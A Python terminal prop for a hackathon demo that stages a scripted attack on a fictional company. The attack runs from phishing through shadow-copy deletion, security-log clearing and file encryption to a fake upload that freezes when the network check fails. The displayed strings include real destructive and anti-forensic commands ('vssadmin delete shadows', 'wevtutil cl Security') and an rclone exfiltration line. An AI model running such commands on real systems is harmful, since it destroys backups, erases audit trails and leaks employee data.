#!/usr/bin/env python3
"""GRAYHOUND // ops console - attack simulation for our HackUTD demo.

DEMO PROP - NOT PART OF ARK. This script is not connected to or integrated
with ARK. It only plays the attacker's side of the story on screen.

Nothing here attacks anything. Every command, count and log line is scripted
text. The only network activity is a connection check every 0.5 s during
step 6 (default: a TCP connect to 1.1.1.1:443), used to decide when the fake
upload "loses its connection". When the RED button kills this laptop's Wi-Fi,
the check fails and the upload freezes.

Keys: Enter = next step. Any time: F = freeze now, G = reconnect ending now,
R = reset to the start, Q = quit.

    python hacker.py --check                    # is this laptop online?
    python hacker.py                            # checks tcp://1.1.1.1:443
    python hacker.py --target tcp://8.8.8.8:53  # if the venue blocks 1.1.1.1
    python hacker.py --speed 1.5                # faster upload bar
"""

import argparse
import math
import os
import random
import shutil
import socket
import sys
import threading
import time
import urllib.request

RST = "\x1b[0m"
RED = "\x1b[31m"
BRED = "\x1b[1;91m"
GREEN = "\x1b[32m"
BGREEN = "\x1b[1;92m"
YELLOW = "\x1b[93m"
WHITE = "\x1b[97m"
GREY = "\x1b[37m"
TAGC = "\x1b[90m"

# The made-up company. Change this one line to rename it everywhere.
# Keep the ".example" ending: that domain is reserved and can never be a real company.
DOMAIN = "meridian.example"

TYPE_DELAY = 0.025     # seconds per typed character
PING_EVERY = 0.5
PING_TIMEOUT = 0.8
TOTAL_GB = 40.2
CEILING = 97.0         # the upload approaches this percentage, never reaches it
TAU = 65.0             # upload time constant in seconds at --speed 1
BAR_W = 32
TAG_COL = 58

EXFIL_CMD = r"rclone copy \\HR-DB\Employees grayhound-drop:"
EXFIL_TAG = "T1567 Exfiltration over web service"
LOCKOUT = (
    ("m.ortiz", "ACCESS DENIED - account disabled"),
    ("svc-backup", "ACCESS DENIED - credentials rotated"),
)


class Quit(Exception):
    pass


class Reset(Exception):
    pass


class Jump(Exception):
    """F or G pressed before step 6: skip straight to the upload."""

    def __init__(self, key):
        super().__init__(key)
        self.key = key


def ping(opener, url, timeout):
    """One check; returns (ok, detail).

    tcp://host:port  -> plain TCP connection test (default: is this laptop online?)
    http://host:port -> GET /ping on our target_server.py, expects "ok"
    """
    if url.startswith("tcp://"):
        host, port = url[6:].split("/")[0].rsplit(":", 1)
        try:
            with socket.create_connection((host, int(port)), timeout=timeout):
                return True, "connected"
        except OSError as e:
            return False, str(e)
    try:
        with opener.open(url, timeout=timeout) as resp:
            body = resp.read(16).strip()
            if resp.getcode() == 200 and body == b"ok":
                return True, "answered ok"
            return False, "answered {} {!r}".format(resp.getcode(), body)
    except Exception as e:
        return False, str(getattr(e, "reason", e))


def no_proxy_opener():
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))


class Pinger:
    """Polls the target in a background thread and keeps every result."""

    def __init__(self, url):
        self.url = url
        self.results = []  # True = answered "ok"
        self.lock = threading.Lock()
        self.stopped = threading.Event()
        self.opener = no_proxy_opener()
        threading.Thread(target=self._run, name="pinger", daemon=True).start()

    def _run(self):
        while not self.stopped.is_set():
            started = time.monotonic()
            ok, _ = ping(self.opener, self.url, PING_TIMEOUT)
            with self.lock:
                self.results.append(ok)
            self.stopped.wait(max(0.0, PING_EVERY - (time.monotonic() - started)))

    def stop(self):
        self.stopped.set()

    def snapshot(self):
        with self.lock:
            return list(self.results)


def fail_streak(results):
    n = 0
    for ok in reversed(results):
        if ok:
            break
        n += 1
    return n


def recovered(results, base):
    """True once a failed ping at index >= base is followed by a good one."""
    try:
        first_fail = results.index(False, base)
    except ValueError:
        return False
    return True in results[first_fail + 1:]


class Keys:
    """Non-blocking single-key reader for Windows and macOS/Linux terminals."""

    def __init__(self):
        self.fd = None
        if os.name == "nt":
            import msvcrt
            self.msvcrt = msvcrt
        else:
            import termios
            import tty
            self.fd = sys.stdin.fileno()
            self.saved = termios.tcgetattr(self.fd)
            tty.setcbreak(self.fd)

    def get(self):
        if os.name == "nt":
            m = self.msvcrt
            while m.kbhit():
                ch = m.getwch()
                if ch in ("\x00", "\xe0"):  # arrow/function key: drop both halves
                    m.getwch()
                    continue
                return ch
            return None
        import select
        if not select.select([self.fd], [], [], 0)[0]:
            return None
        ch = os.read(self.fd, 1).decode(errors="ignore")
        if ch == "\x1b":  # arrow/function key: drop the rest of the sequence
            while select.select([self.fd], [], [], 0.01)[0]:
                os.read(self.fd, 1)
            return None
        return ch or None

    def close(self):
        if self.fd is not None:
            import termios
            termios.tcsetattr(self.fd, termios.TCSADRAIN, self.saved)


class Screen:
    """Full-screen mode: ANSI on, alternate buffer, hidden cursor; close() undoes it."""

    def __init__(self, out):
        self.out = out
        self.restore = None
        if os.name == "nt":
            import ctypes
            k32 = ctypes.windll.kernel32
            handle = k32.GetStdHandle(-11)
            mode = ctypes.c_uint32()
            if k32.GetConsoleMode(handle, ctypes.byref(mode)):
                k32.SetConsoleMode(handle, mode.value | 0x0004)  # VIRTUAL_TERMINAL_PROCESSING
                self.restore = (k32, handle, mode.value)
        out.write("\x1b[?1049h\x1b[?25l")
        out.flush()

    def close(self):
        self.out.write(RST + "\x1b[?25h\x1b[?1049l")
        self.out.flush()
        if self.restore:
            k32, handle, mode = self.restore
            k32.SetConsoleMode(handle, mode)


class Console:
    def __init__(self, target, speed, keys, out):
        self.ping_url = target.rstrip("/") + "/ping"
        self.speed = speed
        self.keys = keys
        self.out = out
        self.stage = "steps"        # steps -> upload -> frozen -> ending -> done
        self.want_freeze = False
        self.want_ending = False
        self.enter = False
        self.waiting = False        # waiting for Enter
        self.bare_prompt = False    # a "$ " is on screen with nothing typed after it
        self.col = 0

    # ---- output -------------------------------------------------------------

    def w(self, text, color=""):
        self.out.write(color + text + RST if color else text)
        self.out.flush()
        self.col += len(text)

    def nl(self):
        self.out.write("\r\n")
        self.out.flush()
        self.col = 0

    def line(self, text, color=GREY, tag=None):
        self.w(text, color)
        if tag:
            self.tag(tag)
        self.nl()

    def tag(self, label):
        label = "[" + label + "]"
        width = shutil.get_terminal_size((100, 30)).columns
        col = max(self.col + 2, min(TAG_COL, width - len(label) - 1))
        if col + len(label) >= width:
            self.nl()
            col = max(0, width - len(label) - 1)
        self.w(" " * (col - self.col) + label, TAGC)

    def prompt(self):
        self.w(" $ ", BGREEN)
        self.bare_prompt = True

    def type(self, text):
        self.bare_prompt = False
        for ch in text:
            self.w(ch, WHITE)
            self.pump(TYPE_DELAY)

    def cmd(self, text):
        """Type a command after an existing prompt; output follows ~300 ms later."""
        self.type(text)
        self.nl()
        self.pump(0.3)

    def auto_type(self, text):
        """Prompt and type a command without waiting for Enter."""
        self.prompt()
        self.pump(0.3)
        self.type(text)

    def spin(self, secs):
        end = time.monotonic() + secs
        i = 0
        while time.monotonic() < end:
            self.out.write("|/-\\"[i % 4] + "\b")
            self.out.flush()
            self.pump(0.1)
            i += 1
        self.out.write(" \b")

    # ---- keys -----------------------------------------------------------------

    def poll(self):
        while True:
            k = self.keys.get()
            if k is None:
                return
            k = k.lower()
            if k in ("q", "\x03"):
                raise Quit
            if k == "r":
                raise Reset
            if k in ("\r", "\n"):
                self.enter = True
            elif k in ("f", "g"):
                self.fallback(k)

    def fallback(self, k):
        if self.stage == "steps":
            raise Jump(k)
        if self.stage == "upload":
            self.want_freeze = True
            self.want_ending = self.want_ending or k == "g"
        elif self.stage == "frozen" and k == "g":
            self.want_ending = True

    def pump(self, secs):
        """Sleep for secs while handling keys."""
        end = time.monotonic() + secs
        while True:
            self.poll()
            left = end - time.monotonic()
            if left <= 0:
                return
            time.sleep(min(left, 0.02))

    def wait_enter(self):
        self.prompt()
        self.out.write("\x1b[?25h")
        self.enter = False  # Enter pressed during an animation doesn't count
        self.waiting = True
        try:
            while not self.enter:
                self.pump(0.03)
        finally:
            self.waiting = False
            self.out.write("\x1b[?25l")

    # ---- the show -------------------------------------------------------------

    def run(self):
        while True:
            try:
                self.session()
            except Reset:
                continue

    def session(self):
        self.stage = "steps"
        self.want_freeze = self.want_ending = False
        self.bare_prompt = False
        self.banner()
        jump = None
        try:
            steps = (self.step_lure, self.step_vpn, self.step_shadows, self.step_logs, self.step_lock)
            for i, step in enumerate(steps):
                if i:
                    self.nl()
                self.wait_enter()
                step()
            self.nl()
            self.wait_enter()
        except Jump as j:
            jump = j.key
            if not self.bare_prompt:
                if self.col:
                    self.nl()
                self.nl()
                self.prompt()
        self.upload(jump)
        self.stage = "done"
        while True:  # only R and Q from here
            self.pump(0.05)

    def banner(self):
        self.out.write(RST + "\x1b[2J\x1b[3J\x1b[H")
        self.col = 0
        self.nl()
        self.w(" GRAYHOUND", BRED)
        self.w(" // ops console", WHITE)
        self.w("   target: ", GREY)
        self.line(DOMAIN, YELLOW)
        width = shutil.get_terminal_size((100, 30)).columns
        self.line(" " + "\u2500" * max(10, min(78, width - 2)), RED)
        self.line(" operator 203.0.113.47   relay 203.0.113.88", TAGC)
        self.nl()

    def step_lure(self):
        self.cmd('send-lure --to m.ortiz@' + DOMAIN + ' --subject "Q4 Vendor Contract - review & sign"')
        self.w("   lure delivered, waiting for click... ")
        self.spin(2.0)
        self.line("victim clicked.", GREEN)
        self.pump(0.4)
        self.line("   credentials captured: m.ortiz / ********", YELLOW, tag="T1566.002 Phishing: link")

    def step_vpn(self):
        self.cmd("vpn-login --user m.ortiz --host vpn." + DOMAIN)
        self.pump(0.5)
        self.line("   session opened on FIN-LAPTOP-07", YELLOW, tag="T1078 Valid accounts")

    def step_shadows(self):
        self.cmd("vssadmin delete shadows /all /quiet")
        self.pump(0.6)
        self.line("   Successfully deleted 14 shadow copies.", tag="T1490 Inhibit system recovery")

    def step_logs(self):
        self.cmd("wevtutil cl Security")
        self.pump(0.4)
        self.line("   Security log cleared.", tag="T1070.001 Clear event logs")

    def step_lock(self):
        self.cmd(r"lock --share \\FS-01\Finance --note README_GRAYHOUND.txt")
        total, secs = 1284, 3.0
        start = time.monotonic()
        while True:
            t = min(1.0, (time.monotonic() - start) / secs)
            n = round(total * t * t * (3 - 2 * t))  # ease in and out
            filled = BAR_W * n // total
            self.out.write("\r")
            self.col = 0
            self.w("   encrypting  [")
            self.w("\u2588" * filled, RED)
            self.w("\u2591" * (BAR_W - filled) + "]")
            self.w("  {:>5,} / {:,} files".format(n, total))
            if t >= 1.0:
                break
            self.pump(0.05)
        self.nl()
        self.pump(0.3)
        self.line("   done.", tag="T1486 Data encrypted for impact")

    # ---- step 6: the upload ---------------------------------------------------

    def upload(self, jump):
        self.stage = "upload"
        self.want_freeze = jump is not None
        self.want_ending = jump == "g"
        self.type(EXFIL_CMD)
        self.tag(EXFIL_TAG)
        self.nl()
        pinger = Pinger(self.ping_url)
        try:
            pct, gb = self.transfer(pinger)
            self.stall(pinger, pct, gb)
        finally:
            pinger.stop()
        self.lockout()

    def progress(self, t):
        pct = min(CEILING * (1 - math.exp(-t * self.speed / TAU)), CEILING - 0.01)
        return pct, TOTAL_GB * pct / 100

    def rate(self, t):
        """MB/s: the slope of progress(), so the numbers agree with the bar."""
        k = self.speed / TAU
        return TOTAL_GB * 1000 * CEILING / 100 * k * math.exp(-t * k)

    def draw_bar(self, pct, gb, rate, frozen=False):
        filled = int(BAR_W * pct / 100)
        self.out.write("\r")
        self.col = 0
        self.w("   [")
        self.w("\u2588" * filled, RED if frozen else GREEN)
        self.w("\u2591" * (BAR_W - filled) + "]")
        self.w("  {:>3}%   {:4.1f} / {} GB   {:4.0f} MB/s ".format(int(pct), gb, TOTAL_GB, rate),
               BRED if frozen else WHITE)

    def transfer(self, pinger):
        """Run the bar until the link drops (2 failed pings in a row) or F/G."""
        start = time.monotonic()
        frame, rate = 0, 0.0
        while True:
            t = time.monotonic() - start
            pct, gb = self.progress(t)
            if frame % 3 == 0:
                rate = self.rate(t) * random.uniform(0.92, 1.08)
            results = pinger.snapshot()
            # Only after the target has answered once, so a laptop that never
            # joined the hotspot creeps on instead of freezing in the first second.
            lost = True in results and fail_streak(results) >= 2
            if lost or (self.want_freeze and t >= 1.0):
                break
            self.draw_bar(pct, gb, rate)
            self.pump(0.1)
            frame += 1
        self.draw_bar(pct, gb, 0, frozen=True)
        self.nl()
        return pct, gb

    def stall(self, pinger, pct, gb):
        """Print the connection loss, then wait for the target to come back (or G)."""
        self.stage = "frozen"
        results = pinger.snapshot()
        streak = fail_streak(results)
        # The ending needs a failure at or after base followed by a success, so a
        # manual F while the network is fine does not end the show by itself.
        base = len(results) - streak if streak else len(results)
        self.line("   CONNECTION LOST - upload stalled at {}% ({:.1f} / {} GB)".format(
            int(pct), gb, TOTAL_GB), BRED)
        for text, color in (("retrying...", YELLOW), ("retrying...", YELLOW),
                            ("target network unreachable", RED)):
            self.pump(1.2)
            self.line("   " + text, color)
        while not (self.want_ending or recovered(pinger.snapshot(), base)):
            self.pump(0.1)

    def lockout(self):
        self.stage = "ending"
        self.nl()
        self.line("   target reachable again", BGREEN)
        for user, result in LOCKOUT:
            self.pump(0.9)
            command = "vpn-login --user " + user
            self.auto_type(command)
            self.pump(0.8)
            self.w(" " * (32 - len(command)))
            self.line(result, BRED)
        self.pump(0.9)
        self.line("   session terminated.", BRED)


def check(url):
    ok, detail = ping(no_proxy_opener(), url, 2.0)
    print("{}  {}  {}".format("REACHABLE  " if ok else "UNREACHABLE", url, detail))
    return 0 if ok else 1


def main():
    p = argparse.ArgumentParser(description="GRAYHOUND demo console (theater: attacks nothing).")
    p.add_argument("--target", default="tcp://1.1.1.1:443",
                   help="what to check: tcp://host:port (is this laptop online?) "
                        "or http://host:port for target_server.py (default: %(default)s)")
    p.add_argument("--speed", type=float, default=3.5,
                   help="upload speed multiplier (default: %(default)s)")
    p.add_argument("--check", action="store_true", help="ping the target once and exit")
    args = p.parse_args()
    if args.speed <= 0:
        p.error("--speed must be greater than 0")
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    if args.check:
        sys.exit(check(args.target.rstrip("/") + "/ping"))

    keys = Keys()
    screen = Screen(sys.stdout)
    try:
        Console(args.target, args.speed, keys, sys.stdout).run()
    except (Quit, KeyboardInterrupt):
        pass
    finally:
        screen.close()
        keys.close()


if __name__ == "__main__":
    main()